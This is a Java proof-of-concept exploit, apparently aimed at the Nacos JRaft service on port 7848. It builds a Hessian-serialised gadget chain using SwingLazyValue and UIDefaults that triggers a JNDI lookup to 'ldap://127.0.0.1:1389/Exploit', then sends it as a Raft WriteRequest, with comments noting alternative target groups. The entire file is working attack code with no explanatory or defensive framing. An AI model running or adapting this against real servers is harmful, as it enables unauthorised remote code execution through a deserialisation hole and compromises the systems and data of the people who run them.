import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.google.protobuf.ByteString;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;


public class Main {

    public static void send(String addr, byte[] payload) throws Exception {
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);
        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        // 可以打三次
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payload)).build();
//        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_instance_metadata").setData(ByteString.copyFrom(payload)).build();
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_service_metadata").setData(ByteString.copyFrom(payload)).build();
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
    }

    private static byte[] build() throws Exception {
        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/Exploit"});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("key", swingLazyValue);
        u2.put("key", swingLazyValue);
        HashMap hashMap = new HashMap();
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, u1, null, null);
        Object node2 = constructor.newInstance(0, u2, null, null);
        Field key = node.getDeclaredField("key");
        key.setAccessible(true);
        key.set(node1, u1);
        key.set(node2, u2);
        Field size = HashMap.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(hashMap, 2);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        table.set(hashMap, arr);


        HashMap hashMap1 = new HashMap();
        size.set(hashMap1, 2);
        table.set(hashMap1, arr);


        HashMap map = new HashMap();
        map.put(hashMap, hashMap);
        map.put(hashMap1, hashMap1);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(map);
        output.flushBuffer();

        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = build();
        send("localhost:7848", bytes);
    }
}